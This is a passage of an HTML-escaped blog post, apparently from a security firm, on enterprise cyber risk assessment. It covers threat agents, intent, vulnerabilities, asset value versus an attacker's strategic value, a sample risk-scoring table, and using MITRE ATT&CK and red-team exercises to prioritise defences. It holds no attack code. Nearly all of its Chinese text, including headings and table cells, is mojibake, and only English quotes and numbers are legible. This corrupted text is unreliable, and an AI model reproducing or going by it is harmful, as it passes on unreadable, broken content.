&lt;h2 id=&quot;ÁúüÂØ¶ÁöÑÈ¢®Èö™ÂÖ∂ÂØ¶Ë§áÈõúÁöÑÈõ£‰ª•Ë©ïÈëë&quot;&gt;ÁúüÂØ¶ÁöÑÈ¢®Èö™ÂÖ∂ÂØ¶Ë§áÈõúÁöÑÈõ£‰ª•Ë©ïÈëë&lt;/h2&gt;
&lt;p&gt;Âú®ÈÄôË£°ÊàëÂÄëÂºïËø∞ ITGovernance Â∞çÊñºÈ¢®Èö™Ë©ïÈëëÁöÑÂÆöÁæ©Ôºö&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Risk Assessment ‚Äì the process of identifying, analyzing and evaluating risk ‚Äì is the only way to ensure that the cyber security controls you choose are appropriate to the risks your organization faces.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;È¢®Èö™Ë©ïÈëëÁöÑÁ≤æÈ´ìÂú®ÊñºÂæåÂçäÊÆµÁöÑ&lt;strong&gt;Á¢∫‰øùÊâÄÈÅ∏ÊìáÁöÑÊéßÂà∂Êé™ÊñΩÊòØÂê¶ÈÅ©ÂàáÊñº‰ºÅÊ•≠ÁúüÊ≠£Èù¢Ëá®ÁöÑÈ¢®Èö™&lt;/strong&gt;Ôºå‰ΩÜÂ§öÊï∏ÁöÑ‰ºÅÊ•≠Âè™ÂÆåÊàêÂâçÂçäÊÆµ&lt;strong&gt;Ë≠òÂà•„ÄÅÂàÜÊûêÂèäË©ï‰º∞È¢®Èö™&lt;/strong&gt;ÔºåÂ∞éËá¥È¢®Èö™Ë©ïÈëëÁöÑÊàêÊïàÁÑ°Ê≥ïÂÆåÂÖ®ÁôºÊèÆÔºõËÄåË¶ÅÈÅîÂà∞È¢®Èö™Ë©ïÈëëÁöÑÁ≤æÈ´ìÔºåÂæóÂÖà‰∫ÜËß£&lt;strong&gt;ÁúüÂØ¶ÁöÑÈ¢®Èö™&lt;/strong&gt;ÁöÑÁµÑÊàêÁöÑË¶ÅÁ¥†&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ÁúüÂØ¶È¢®Èö™ = { Â®ÅËÑÖ‰æÜÊ∫ê„ÄÅÊÑèÂúñ„ÄÅÂ®ÅËÑÖ„ÄÅÂº±Èªû„ÄÅÊ©üÁéá„ÄÅÁõ∏‰æùÊÄß„ÄÅË≥áÁî¢ÂÉπÂÄº„ÄÅÊéßÂà∂Êé™ÊñΩ }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Â®ÅËÑÖ‰æÜÊ∫ê(Threat Agent)ÔºöÈÄ†ÊàêÂ®ÅËÑÖÊàñ‰ΩøÁî®Âº±ÈªûÁöÑ‰æÜÊ∫êÂÄãÈ´îÔºå‰æãÂ¶ÇÔºöÁµÑÁπîÂûãÁäØÁΩ™„ÄÅÈß≠ÂÆ¢ÁµÑÁπî„ÄÅÂúãÂÆ∂Ë≥áÂä©ÁäØÁΩ™„ÄÅÁ´∂Áà≠Â∞çÊâã„ÄÅÈß≠ÂÆ¢„ÄÅÂÖßÈÉ®Âì°Â∑•ÊàñÂ§©ÁÅΩÁ≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊÑèÂúñ(Intent)ÔºöÂ®ÅËÑÖ‰æÜÊ∫êÁöÑÊÉ≥ÈÅîÂà∞ÁöÑÁõÆÁöÑÔºå‰æãÂ¶ÇÔºöÂèñÂæóÂÄã‰∫∫Ë≥áÊñô„ÄÅÁõúÂèñÂïÜÊ•≠Ê©üÂØÜ„ÄÅÁ†¥Â£û‰ºÅÊ•≠/ÂÄã‰∫∫ÂΩ¢Ë±°„ÄÅÈÄ†ÊàêË≤°Áâ©ÊêçÂ§±Á≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;Â®ÅËÑÖ(Threat)ÔºöÈÅîÊàêÊÑèÂúñÁöÑÊñπÂºèÔºå‰æãÂ¶ÇÔºöÊÉ°ÊÑèÁ®ãÂºè„ÄÅÁ§æ‰∫§Â∑•Á®ã„ÄÅDDoS„ÄÅÂà©Áî®Á≥ªÁµ±ÊºèÊ¥ûÁ≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âº±Èªû(Vulnerability)ÔºöÊåáË≥áÁî¢ËÉΩË¢´Â®ÅËÑÖÂà©Áî®ÁöÑÂº±ÈªûÔºå‰æãÂ¶ÇÔºöÊºèÊ¥ûÊú™Êõ¥Êñ∞„ÄÅ‰∫∫Âì°ÁñèÂøΩ„ÄÅÁµÑÊÖãË®≠ÂÆö‰∏çÁï∂„ÄÅÁ∂≤Ë∑ØÂçÄÈöîÈÖçÁΩÆÈåØË™§Á≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ê©üÁéá(Probability)ÔºöÊåáÂº±ÈªûÁöÑÊòìÁî®Â∫¶ÊàñÂèØËÉΩÁôºÁîüÁöÑÊ©üÁéáÔºå‰æãÂ¶ÇÔºöCVSS 3.0ÂàÜÊï∏„ÄÅÈÅéÂéªÂ∞çÊñºÊüêÂÄãÂº±ÈªûÁôºÁîüÈ†ªÁéáÁöÑÁµ±Ë®àÁ≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;Áõ∏‰æùÊÄß(Correlation)ÔºöË≥áÁî¢ÂΩºÊ≠§ÈñìÁöÑÈóúËÅØÔºå‰æãÂ¶ÇÔºöÁ∂≤Ë∑ØÊãìÊ®∏„ÄÅËôõÊì¨ÂåñÁöÑÈóú‰øÇ„ÄÅÈõÜ‰∏≠Ê¥æÁâàÁ≥ªÁµ±„ÄÅÈò≤ÊØí‰∏≠Êéß‰∏ªÊ©üÁ≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ë≥áÁî¢ÂÉπÂÄº(Value)Ôºö‰ºÅÊ•≠Ë™çÂÆöË©≤Ë≥áÁî¢Âú® C„ÄÅI„ÄÅA ÂèäÊ≥ïÂæãË°ùÊìä‰∏ãÔºåÊâÄÂÖ∑ÊúâÁöÑÂÉπÂÄºÔºå‰æãÂ¶ÇÔºöÊ†∏ÂøÉÁ≥ªÁµ±ÂèäË≥áÊñô„ÄÅ‰∏ÄËà¨Êìç‰ΩúË≥áÊñô„ÄÅÂØ¶È´îË®≠ÂÇôÁ≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊéßÂà∂Êé™ÊñΩ(Countermeasure)ÔºöÁî®‰æÜÈôç‰Ωé‰ºÅÊ•≠Èù¢Ëá®È¢®Èö™ÁöÑÊé™ÊñΩÔºå‰æãÂ¶ÇÔºöË≥áÂÆâË®≠ÂÇô„ÄÅÁÆ°ÁêÜÂà∂Â∫¶„ÄÅÊïôËÇ≤Ë®ìÁ∑¥Á≠â„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÁÑ∂ËÄåÔºåÂ§öÊï∏‰ºÅÊ•≠Âú®Ë©ï‰º∞‰ºÅÊ•≠È¢®Èö™ÊôÇÔºåÁÇ∫Ê±ÇÊñπ‰æøÔºåÊúÉÂ∞áÈ¢®Èö™Ë©ïÈëëÁöÑÂèÉÊï∏Á∞°ÂåñÊàê {&lt;strong&gt;Âº±Èªû„ÄÅÊ©üÁéá„ÄÅË≥áÁî¢ÂÉπÂÄº&lt;/strong&gt;}ÔºåÂøΩÁï•‰∫ÜËàáÊïµ‰∫∫Áõ∏ÈóúÁöÑÂèÉÊï∏ {Â®ÅËÑÖ‰æÜÊ∫ê„ÄÅÊÑèÂúñ„ÄÅÂ®ÅËÑÖ„ÄÅÊà∞Áï•ÂÉπÂÄº}ÔºõÊé•‰∏ã‰æÜÁöÑÂÖ©ÂÄã‰æãÂ≠êÂ∞áË™™ÊòéÂøΩÁï•ÂæåÈÄ†ÊàêÈ¢®Èö™Ë©ïÈëëÁöÑÂÅèÂ∑ÆÔºåÂåÖÂê´‰∫Ü&lt;strong&gt;Ë≥áÁî¢ÂÉπÂÄºÁöÑËºïÂøΩ&lt;/strong&gt;Âèä&lt;strong&gt;ËºïÂøΩÊºèÊ¥ûÂà©Áî®ÁöÑÂèØËÉΩÊÄß&lt;/strong&gt;„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÁèæÂØ¶È¢®Èö™Ë©ïÈëëÂèØËÉΩÁöÑÂÅèÂ∑Æ&quot;&gt;ÁèæÂØ¶È¢®Èö™Ë©ïÈëëÂèØËÉΩÁöÑÂÅèÂ∑Æ&lt;/h2&gt;
&lt;h3 id=&quot;Êïµ‰∫∫Âú®ÊÑèÁöÑÊòØÊà∞Áï•ÂÉπÂÄºËÄå‰∏çÂÉÖÊòØË≥áÁî¢ÂÉπÂÄº&quot;&gt;Êïµ‰∫∫Âú®ÊÑèÁöÑÊòØÊà∞Áï•ÂÉπÂÄºËÄå‰∏çÂÉÖÊòØË≥áÁî¢ÂÉπÂÄº&lt;/h3&gt;

&lt;p&gt;ÈÄèÈÅéÈ¢®Èö™Ë©ïÈëëÂèØ‰ª•Ë≠òÂà•Âá∫Ë≥áÁî¢ÂèØËÉΩÈù¢Ëá®ÁöÑÈ¢®Èö™Ôºå‰∏¶‰∏î‰ΩúÁÇ∫È†êÁÆóÊàñË≥áÊ∫êÊäïÂÖ•ÂÑ™ÂÖàÈ†ÜÂ∫èÁöÑÂèÉËÄÉÔºå‰∏ÄËà¨ÂèØ‰ª•ÂàÜÁÇ∫ 3 ÂÄãÂÑ™ÂÖàÁ≠âÁ¥öÔºö&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;ÂÑ™ÂÖàËôïÁêÜ„ÄåÈ´òË°ùÊìä„ÄÅÈ´òÊ©üÁéá„Äç (È†ÖÊ¨° 1„ÄÅÈ†ÖÊ¨° 2) ÁöÑÈ¢®Èö™ÔºöÈÄöÂ∏∏ÊòØË∂ÖÂá∫‰ºÅÊ•≠ÂèØÊé•ÂèóÈ¢®Èö™ÁöÑÂ®ÅËÑÖÔºåËóâÁî±ÊéßÂà∂Êé™ÊñΩÂ∞áÈ¢®Èö™‰∏ãÈôçÂà∞ÂèØÊé•ÂèóÁöÑÁ®ãÂ∫¶ÔºåÈÄôÈÉ®ÂàÜÈÄöÂ∏∏ÊòØ‰ºÅÊ•≠Ë≥áÊ∫êÂÑ™ÂÖàÊàñÊåÅÁ∫åÊäïÂÖ•ÁöÑÈáçÈªû„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ê¨°‰πãÊòØ„ÄåÈ´òË°ùÊìä„ÄÅ‰ΩéÊ©üÁéá „Äç(È†ÖÊ¨° 3„ÄÅÈ†ÖÊ¨° 4)ÁöÑÈ¢®Èö™ÔºöÊ≠§Á≠âÁ¥öÊòØÂ±¨ÊñºÈúÄË¶ÅÊåÅÁ∫åÈóúÊ≥®ÈÅøÂÖçÂçáÈ´òÁöÑÈ¢®Èö™ÔºåÂ¶ÇÊûú‰ºÅÊ•≠È†êÁÆó‰ªçÊúâÈ§òË£ïÔºåÊáâË©≤ÊäïÂÖ•ÁöÑÁ¨¨‰∫åÂÄãÁ≠âÁ¥ö„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊúÄÂæåÊòØ„Äå‰ΩéË°ùÊìä„ÄÅ‰ΩéÊ©üÁéá „Äç(È†ÖÊ¨° 5„ÄÅÈ†ÖÊ¨° 6)ÁöÑÈ¢®Èö™ÔºöÁúãËµ∑‰æÜÂ∞ç‰ºÅÊ•≠‰∏çÊúÉÊúâÁ´ãÂç≥Âç±ÂÆ≥Ôºå‰∏ÄËà¨‰∏çÈúÄÁâπÂà•ÈóúÊ≥®ÊàñÊäïÂÖ•Ë≥áÊ∫ê„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;È†ÖÊ¨°&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Ë≥áÁî¢ÂêçÁ®±&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;ÂÉπÂÄº&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Â®ÅËÑÖ&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Âº±Èªû&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Ë°ùÊìä&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Ê©üÁéá&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;È¢®Èö™&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;‰∫§ÊòìË≥áÊñô&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ËìÑÊÑèÁ†¥Â£û&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Âª∫ÁØâÁâ©ÁÆ°Âà∂‰∏çË∂≥&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Áî®Êà∂ÂÄãË≥á&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ÂãíË¥ñËªüÈ´îÂä†ÂØÜ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ÁÑ°Ê≥ï‰∏ä patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ËΩâÂ∏≥Á≥ªÁµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ËªüÈ´îÂ§±Êïà&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ÈÅ≠Âà∞ DDoS ÊîªÊìä&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;18&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Ê†∏ÂøÉÁ≥ªÁµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ËªüÈ´îÂ§±Êïà&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Á∂≠Ë≠∑ÊúçÂãôÊôÇÈñìÈÅéÈï∑&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ÁâàÊú¨Êõ¥Êñ∞Á≥ªÁµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Êú™Á∂ìÊéàÊ¨äÂ≠òÂèñ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Ê©´ÂêëÁßªÂãï&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ÂÖßÈÉ®Â∑ÆÂã§Á≥ªÁµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Á≥ªÁµ±ÂÖ•‰æµ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ÁÑ°Ê≥ï‰∏ä patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ÁÑ∂ËÄåÔºåÂ∞çÊïµ‰∫∫ËÄåË®ÄÔºåÈÅ∏ÊìáÊ¨≤Êîª‰∏ãÁöÑÁÅòÈ†≠Â†°ÊôÇÔºåÁúãÈáçÁöÑÊòØ&lt;strong&gt;Ë≥áÁî¢ÁöÑÊà∞Áï•ÂÉπÂÄº&lt;/strong&gt;ÔºåËÄåËàáË≥áÁî¢Êú¨Ë∫´ÁöÑÂÉπÂÄºÊ≤íÊúâÂøÖÁÑ∂ÁöÑÈóú‰øÇÔºåÂ¶Ç‰∏äË°®È†ÖÊ¨° 6 ÁöÑÂÖßÈÉ®Â∑ÆÂã§Á≥ªÁµ±Â¶ÇÊûúÊòØËÉΩ‰∏≤Êé•Âà∞Êïµ‰∫∫‰∏ªË¶ÅÁöÑÊ®ôÁöÑÔºåÂ∞ç‰ªñ‰æÜË™™Â∞±ÊòØ‰∏ÄÂÄãÂøÖÂÆöÊúÉË®≠Ê≥ïÂèñÂæóÊéßÂà∂Ê¨äÁöÑË≥áÁî¢ÔºåËÄåÈÄôÊôÇÂèØ‰ª•ÁôºÁèæÁ∂ìÁî±Á∞°ÂåñÁâàÁöÑÈ¢®Èö™Ë©ïÈëë‰∏¶‰∏çÂÆπÊòìÂëàÁèæÈÄôÂÄãË≥áÁî¢ÊâÄÈù¢Ëá®ÁöÑÈ¢®Èö™„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;‰Ωé‰º∞Âº±ÈªûÂèØÂà©Áî®Ê©üÁéá&quot;&gt;‰Ωé‰º∞Âº±ÈªûÂèØÂà©Áî®Ê©üÁéá&lt;/h3&gt;
&lt;p&gt;Èò≤ÂÆàÊñπÂú®‰ΩøÁî®ÂàÜÈö™Ë©ïÈëëÊôÇÔºåÂè¶‰∏ÄÂÄãÂïèÈ°åÊòØÁÑ°Ê≥ïÊ∫ñÁ¢∫ÁöÑ‰º∞Ë®àÂº±ÈªûÁöÑÂèØÂà©Áî®Ê©üÁéáÔºåÈõñÁÑ∂Â∏ÇÈù¢‰∏äÂ∑≤Á∂ìÊúâË®±Â§öÂº±ÈªûÁÆ°ÁêÜËªüÈ´îÂèØ‰ª•ÂçîÂä©Ôºå‰ΩÜÈù¢Â∞çÁúüÂØ¶ÊîªÊìäÊôÇÔºåÊïµ‰∫∫‰∏çÊúÉÂè™Âà©Áî®Â∑≤Áü•ÁöÑÊºèÊ¥ûÊàñÊòØ OWASP TOP10ÔºåÁîöËá≥Ëá™Ë°åÁ†îÁôº 0-day„ÄÇÂõ†Ê≠§ÔºåÁï∂‰ºÅÊ•≠Â∑≤Á∂ìÈÄ≤Ë°å‰∏ÄÂÆöÁ®ãÂ∫¶ÁöÑÈò≤Ë≠∑Êé™ÊñΩÂæåÔºåÂ¶ÇÊûú‰∏çÊõæÁ∂ìÊ≠∑Ë≥áÂÆâ‰∫ãÊïÖÊàñÁº∫‰πèÊ≠£Á¢∫ÁöÑË™çÁü•ÔºåÂæÄÂæÄË™çÁÇ∫ÊáâË©≤‰∏çÊúÉÊúâÈÄôÈ∫ºÂé≤ÂÆ≥ÁöÑÈß≠ÂÆ¢ÂèØ‰ª•Á™ÅÁ†¥Êó¢ÊúâÁöÑÈò≤Ë≠∑Êé™ÊñΩÔºå‰ΩÜÂæûÊ≠∑‰æÜÁöÑË≥áÂÆâ‰∫ãÊïÖÂèäÊàëÂÄëÊúçÂãôÁöÑÁ∂ìÈ©óÂëäË®¥ÊàëÂÄëÔºåÂÖ∂ÂØ¶ÈõªÂΩ±Ë£°Èù¢ÊºîÁöÑÈÉΩÊòØÁúüÁöÑÔºÅÔºÅ&lt;/p&gt;

&lt;h2 id=&quot;ÂæûÊîªÊìäËÄÖÁöÑËßíÂ∫¶ÊîπÂñÑÈ¢®Èö™Ë©ïÈëë&quot;&gt;ÂæûÊîªÊìäËÄÖÁöÑËßíÂ∫¶ÊîπÂñÑÈ¢®Èö™Ë©ïÈëë&lt;/h2&gt;
&lt;p&gt;ÂæàÂ§ö‰∫∫‰ª•ÁÇ∫ÊîªÊìäËÄÖÁöÑËßíÂ∫¶ÊåáÁöÑÊòØÊºèÊ¥ûÊåñÊéòÔºåÂÖ∂ÂØ¶‰∏¶‰∏çÂÖ®ÁÑ∂„ÄÇÊîªÊìäËÄÖÂ∞çÊñºÊÉ≥Á´äÂèñÁöÑË≥áÁî¢Ôºå‰πüÊòØÁ∂ìÈÅéÁ∏ùÂØÜÁöÑË¶èÂäÉÂèäÂèçÔΩûË¶ÜÔΩûËßÄÔΩûÂØüÔΩûÔºå‰ªñÂÄë‰∏ÄÊ®£ÊúâÁ≠ñÁï•„ÄÅÊäÄÊ≥ïË∑üÂ∑•ÂÖ∑„ÄÇËÄå &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK&lt;/a&gt; Â∞±ÊòØ‰∏ÄÂÄãÂ∞çÊñºÂ∑≤Áü•ÊîªÊìäÁ≠ñÁï•ÂèäÊäÄÂ∑ßÂÖ∑ÂÇôÂÆåÊï¥ÂÆöÁæ©ÂèäÊî∂ÈõÜÁöÑÊ°ÜÊû∂ÔºåÂÆÉÂèØ‰ª•Áî®‰æÜÂçîÂä©Âª∫Á´ãÂ®ÅËÑÖÊÉÖË≥á (Threat Intelligence)„ÄÅÊîπÂñÑÈò≤ÂÆàÊñπÁöÑÂÅµÊ∏¨ÂèäÂàÜÊûê„ÄÅÂº∑ÂåñÊ®°Êì¨Êïµ‰∫∫ÂèäÁ¥ÖÈöäÊºîÁ∑¥Á≠âÔºåÁõ∏ÈóúÁöÑ‰ΩøÁî®ÊñπÂºèÈÉΩÂú®ÂÖ∂ÂÆòÁ∂≤‰∏äÂèØ‰ª•ÊâæÂà∞ÔºåÁ¥∞ÁØÄÊàëÂÄë‰∏çÂú®ÈÄôÈÇä‰ªãÁ¥π„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•Â∞áÂ∑≤Á∂ìÁôºÁîüÁöÑË≥áÂÆâ‰∫ãÊïÖ (Incident) ÊàñÁ¥ÖÈöäÊºîÁ∑¥Â∞çÊáâÂà∞ ATT&amp;amp;CK Enterprise Framework ‰∏≠Ôºå‰∏¶‰∏îË©ï‰º∞ÁõÆÂâçÊâÄÂª∫ÁΩÆÁöÑÊéßÂà∂Êé™ÊñΩÊòØÂê¶ÂèØ‰ª•Ê∏õÁ∑©„ÄÅÈòªÊìãÊàñÂÅµÊ∏¨ÈÄô‰∫õÊäÄÂ∑ß„ÄÇ‰ª•‰∏ãÂúñÁÇ∫‰æãÔºåÊ∑∫Á∂†Ëâ≤ÊñπÂ°äÊòØÁ¥ÖÈöäÊºîÁ∑¥ÊâÄÊé°Áî®ÁöÑÊäÄÂ∑ß„ÄÅÁ¥ÖËâ≤ÊñπÂ°äÂâáÊòØË≥áÂÆâ‰∫ãÊïÖ‰ΩøÁî®ÁöÑÊäÄÂ∑ßÔºå‰ºÅÊ•≠ÂèØ‰ª•ÂêåÊôÇÊØîÂ∞çÂ§öÂÄãË≥áÂÆâ‰∫ãÊïÖÊàñÊòØÁ¥ÖÈöäÊºîÁ∑¥ÁöÑÁµêÊûúÔºåÊâæÂá∫‰∫§ÈõÜÁöÑÊ∑∫ÈªÉËâ≤ÂçÄÂ°äÔºåÂç≥ÊòØ‰ºÅÊ•≠ÂèØ‰ª•ÂÑ™ÂÖàÂº∑ÂåñÁöÑÊéßÂà∂Êé™ÊñΩÊàñÊòØÈ†êÁÆóÊáâË©≤ÊäïÂÖ•‰πãËôï„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÊúâÂÄãÈúÄË¶ÅÁâπÂà•Ê≥®ÊÑèÁöÑÂú∞ÊñπÔºåATT&amp;amp;CK Enterprise Framework ‰ΩúÁÇ∫‰∏ÄÂÄãÈ©óË≠âÈò≤ÂÆàÊñπÊéßÂà∂Êé™ÊñΩÁöÑÊúâÊïàÊÄßÊòØ‰∏ÄÂÄãÈùûÂ∏∏Â•ΩÁöÑÊ°ÜÊû∂ÔºåÁÑ∂ËÄå‰∏çÂª∫Ë≠∞Âà©Áî®ÈÄôÂÄãÊ°ÜÊû∂ÁöÑÁâπÂÆöÊäÄÂ∑ß‰ΩúÁÇ∫ÈôêÂà∂Á¥ÖÈöäÊºîÁ∑¥ÁöÑÊÉÖÂ¢ÉÔºåË¶ÅË®òÂæó„ÄåÁï∂‰ΩøÁî® ATT&amp;amp;CK ÊôÇË¶ÅÊ≥®ÊÑèÊúâÂÖ∂ÂÅèÂ∑ÆÔºåÈÄôÂèØËÉΩÊúÉÂ∞áÂ∑≤Áü•ÁöÑÊîªÊìäË°åÁÇ∫ÂÑ™ÂÖàÊñºÊú™Áü•ÁöÑÊîªÊìäË°åÁÇ∫„ÄçÔºåÊ≠£Â¶ÇÂêåÁ¥ÖÈöäÊºîÁ∑¥ÁöÑÁ≤æÁ•ûÔºåÊòØÈÄèÈÅéÁÑ°ÊâÄ‰∏çÁî®ÂÖ∂Ê•µÁöÑÊñπÂºèÊâæÂà∞ÂèØ‰ª•ÊàêÂäüÁöÑÂÖ•‰æµÊñπÂºèÔºåÂõ†Ê≠§ÊàëÂÄëÊúÉÂª∫Ë≠∞Áµ¶‰∫àÁ¥ÖÈöäÊºîÁ∑¥ÂúòÈöäÊúÄËá™Áî±ÁöÑÁôºÊèÆÁ©∫ÈñìÔºåÊâçËÉΩÁúüÊ≠£ÊâæÂá∫‰ºÅÊ•≠ÂèØËÉΩÁöÑÁõ≤Èªû„ÄÇ&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Remember any ATT&amp;amp;CK-mapped data has biases:You‚Äôre prioritizing known adversary behavior over the unknown.
Ôºç Katie Nickels, Threat Intelligence Lead @ The MITRE Corporation&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;ÊåëÈÅ∏ÈÅ©ÂêàÁöÑÊñπÊ≥ïÊîπÂñÑÈò≤Á¶¶Á≠ñÁï•&quot;&gt;ÊåëÈÅ∏ÈÅ©ÂêàÁöÑÊñπÊ≥ïÊîπÂñÑÈò≤Á¶¶Á≠ñÁï•&lt;/h2&gt;
&lt;p&gt;ÈÇ£È∫ºÂú®ÊàëÂÄë‰∫ÜËß£Êïµ‰∫∫ÊúÉ‰ΩøÁî®ÁöÑÁ≠ñÁï•„ÄÅÊäÄÂ∑ß‰πãÂæåÔºå‰ºÅÊ•≠Ë¶ÅÂ¶Ç‰ΩïÊåëÈÅ∏ÊîπÂñÑÈò≤Á¶¶Á≠ñÁï•ÁöÑÊñπÊ≥ïÔºüÁêÜÊÉ≥‰∏äÔºåÊàëÂÄëÂª∫Ë≠∞Â¶ÇÊûúÈ†êÁÆóË®±ÂèØÔºå&lt;a href=&quot;https://devco.re/services/red-team#service-content-3&quot;&gt;ÈÄôÈ°ûÂûã&lt;/a&gt;ÁöÑ‰ºÅÊ•≠Ëá≥Â∞ëÊáâË©≤Âü∑Ë°å‰∏ÄÊ¨°È´òÂº∑Â∫¶ÁöÑÁ¥ÖÈöäÊºîÁ∑¥Ôºå‰æÜÂÖ®Èù¢ÊÄßÁöÑÁõ§Èªû‰ºÅÊ•≠Èù¢Ëá®ÁöÑÂ®ÅËÑÖÔºå‰ΩÜÁèæÂØ¶‰∏ä‰∏¶ÈùûÊØèÂÄã‰ºÅÊ•≠ÈÉΩÊúâË∂≥Â§†ÁöÑÈ†êÁÆó„ÄÇÂõ†Ê≠§ÔºåÂú®‰∏çÂêåÁöÑÊ¢ù‰ª∂‰∏ãÔºåÂèØ‰ª•‰ΩøÁî®‰∏çÂêåÁöÑÊñπÊ≥ï‰æÜÊîπÂñÑÈò≤Á¶¶Á≠ñÁï•ÔºåÊàëÂÄëÂª∫Ë≠∞ÂèØ‰ª•Âæû‰ª•‰∏ãÂπæÂÄãÂõ†Á¥†ÈÄ≤Ë°åË©ï‰º∞Ôºö&lt;/p&gt;
